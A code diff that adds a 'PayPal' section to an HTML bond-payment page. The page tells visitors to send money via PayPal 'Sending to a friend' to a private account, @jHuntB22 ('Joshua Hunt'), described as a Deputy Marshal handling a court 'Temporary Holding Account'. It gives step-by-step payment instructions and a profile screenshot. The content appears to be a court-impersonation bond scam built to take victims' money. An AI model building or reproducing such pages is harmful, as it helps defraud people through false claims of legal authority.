@@ -957,6 +957,86 @@
             </div>
         </div>
 
+        <!-- PayPal Option -->
+        <div class="payment-option">
+            <div class="payment-header" onclick="togglePayment('paypal')">
+                <div class="payment-title">
+                    <span class="payment-badge">#5</span>
+                    <span>PayPal</span>
+                </div>
+                <span class="payment-speed">Instant</span>
+            </div>
+            <div class="payment-content" id="paypal-content">
+                <div class="payment-details">
+                    <div class="info-box">
+                        <h3>💳 SEND TO: Joshua Hunt</h3>
+                        <p><strong>PayPal Username: @jHuntB22</strong></p>
+                        <p style="margin-top: 10px; font-size: 0.95em; color: #2d3748;"><em>Joshua Hunt is a Deputy Marshal at the courthouse who facilitates the deposit into the court's Temporary Holding Account (THA) as part of the standard bond payment processing procedure.</em></p>
+                        <p><strong>Transaction Limits: Up to $10,000</strong> (varies by account type)</p>
+                        <p>Trusted worldwide payment platform with buyer and seller protection!</p>
+                    </div>
+
+                    <h3 style="margin: 20px 0; color: #2d3748;">💳 First Time Using PayPal? Follow These Simple Steps!</h3>
+                    <p style="margin-bottom: 20px; color: #4a5568;">PayPal is one of the most trusted online payment platforms worldwide. It's secure and easy to use!</p>
+
+                    <div class="step-guide">
+                        <h3>STEP-BY-STEP INSTRUCTIONS:</h3>
+
+                        <div class="step">
+                            <h4>Step 1: Create a PayPal account</h4>
+                            <p>Go to <a href="https://www.paypal.com" target="_blank" style="color: #0070ba; text-decoration: underline;">www.paypal.com</a> or download the PayPal app from the App Store (iPhone) or Google Play (Android). Click "Sign Up" and choose "Personal Account". Enter your email, create a password, and fill in your personal information. Verify your email address by clicking the link PayPal sends you.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 2: Link a payment method</h4>
+                            <p>Log in to your PayPal account. Click "Wallet" at the top of the page. Click "Link a debit or credit card" or "Link a bank account". Enter your card or bank details and confirm. PayPal may make small test deposits to verify your bank account.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 3: Send money to Joshua Hunt</h4>
+                            <p>Click "Send & Request" at the top of the page or tap the "Send" button in the app. In the search box, type <strong>@jHuntB22</strong> or search for "Joshua Hunt". Select the correct profile showing "Joshua Hunt" with username @jHuntB22.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 4: Enter payment details</h4>
+                            <p>Enter the payment amount. Select "Sending to a friend" to avoid fees (if available). In the note field, you can write "USDC Bond Payment" and your case number. Review the payment details carefully.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 5: Complete the payment</h4>
+                            <p>Click "Send Payment Now" or "Send" in the app. You may need to confirm with your password, PIN, or biometric authentication. You'll see a confirmation screen showing the payment was sent successfully.</p>
+                        </div>
+                    </div>
+
+                    <div class="success-box">
+                        <p><strong>💡 Important:</strong> Make sure you're sending to the correct PayPal account <strong>@jHuntB22</strong> (Joshua Hunt). Double-check before confirming the payment.</p>
+                    </div>
+
+                    <div class="info-box">
+                        <h3>💳 PayPal Transaction Limits</h3>
+                        <p><strong>Unverified accounts:</strong> Limited sending capability</p>
+                        <p><strong>Verified accounts:</strong> Up to $10,000 per transaction</p>
+                        <p style="margin-top: 10px;">To verify your account, go to Settings → Get Verified and link your bank account or upload ID documents.</p>
+                    </div>
+
+                    <div class="info-box">
+                        <h3>📱 PayPal Account Screenshot</h3>
+                        <p style="margin-bottom: 10px;">Here's what the recipient's PayPal profile looks like:</p>
+                        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663342372065/qJbuXtTXUvNWiGtO.png" alt="Joshua Hunt PayPal Account" style="width: 100%; max-width: 400px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin: 10px 0;">
+                    </div>
+
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="downloadReceipt()">📄 Download Payment Receipt</button>
+                        <button class="btn btn-success" onclick="openScheduleCalendar()">📅 Schedule Signature Analysis Appointment</button>
+                    </div>
+
+                    <div class="footer-note">
+                        <p>⏱️ Estimated appointment duration: 30-45 minutes</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <!-- Coinbase Option -->
         <div class="payment-option">
             <div class="payment-header" onclick="togglePayment('coinbase')">
